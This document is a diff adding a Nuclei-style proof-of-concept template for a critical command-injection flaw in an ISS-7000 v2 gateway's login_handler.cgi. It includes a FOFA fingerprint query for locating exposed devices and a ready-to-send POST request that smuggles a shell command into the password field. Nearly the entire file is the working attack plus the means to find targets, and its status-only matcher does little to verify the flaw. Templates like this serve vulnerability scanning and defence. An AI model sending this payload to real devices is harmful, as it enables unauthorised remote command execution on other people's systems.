@@ -1,0 +1,30 @@
+id: poc-ptf14us65twa07r2
+info:
+  name: ISS-7000 v2网关login_handler.cgi存在命令执行漏洞
+  author: hacktwo
+  severity: critical
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ptf14us65twa07r2'
+  tags: rce,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ptf14us65twa07r2
+    fofa: body="css/login_form_style-06.css"
+http:
+- raw:
+  - 'POST /login_handler.cgi HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Content-Length: 79
+
+    Content-Type: application/x-www-form-urlencoded
+
+    Connection: close
+
+
+    username=admin&password=admin;id;&uilng=3&button=%E7%99%BB%E5%85%A5&Signin='
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
